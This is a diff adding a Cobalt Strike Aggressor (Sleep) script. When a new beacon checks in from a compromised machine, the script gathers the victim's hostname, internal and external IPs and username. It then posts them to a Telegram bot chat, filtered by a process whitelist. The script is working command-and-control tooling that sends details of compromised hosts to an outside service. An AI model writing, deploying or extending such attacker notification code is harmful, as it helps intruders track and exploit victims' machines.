@@ -1,0 +1,55 @@
+import java.net.URL;
+import java.net.URLConnection;
+import java.io.DataOutputStream;
+
+sub http_request {
+  $url = $1;
+	$body = $2;
+	#println($url);
+	#println($body);
+	$urlobj = [new java.net.URL: $url];
+	$con = $null;
+	$con = [$urlobj openConnection];
+	[$con setRequestProperty: "Accept", "*/*"];
+	[$con setDoOutput: true];
+	[$con setRequestProperty: "Content-Type", "application/json"];
+	$outstream = [$con getOutputStream];
+	$doutputstream = [new java.io.DataOutputStream: $outstream];
+	[$doutputstream write: [$body getBytes]];
+	[$doutputstream flush];
+	[$doutputstream close];
+	$inputstream = [$con getInputStream];
+	$handle = [SleepUtils getIOHandle: $inputstream, $outstream];
+	$responseCode = [$con getResponseCode];
+	return $responseCode;
+}
+
+sub sendnot{
+	$message = $1;
+  #telegram bot token
+	$bot_token = "";
+  #telegram chatid
+	$chat_id = "";
+	$url = "https://api.telegram.org/bot". $bot_token. "/sendMessage";
+	$body = "{"."\"chat_id\":\"$chat_id\"".","."\"text\":\"$message\""."}";
+	$code = http_request($url,$body);
+  #success 200 | failed 400
+	println("responseCode:" . $code);
+}
+
+on beacon_initial {
+    $bid = $1;
+    $external_ip = beacon_info($bid, "external");
+    $internal_ip = beacon_info($bid, "internal");
+    $hostname = beacon_info($bid, "computer");
+    $user = beacon_info($bid, "user");
+	#whitelist, if you don't need this, please delete the lines 44-47 and the if-else structure.
+	$wl = @("SystemSettings.exe");
+	$process = beacon_info($bid, "process");
+	if($process in $wl){
+		$msg ="computer: ". $hostname. "\n". "external_ip:". $external_ip. "\n". "internal_ip:". $internal_ip. "\n". "user:". $user;
+		sendnot($msg);
+	}else{
+		println("aborted.");
+	}	
+}
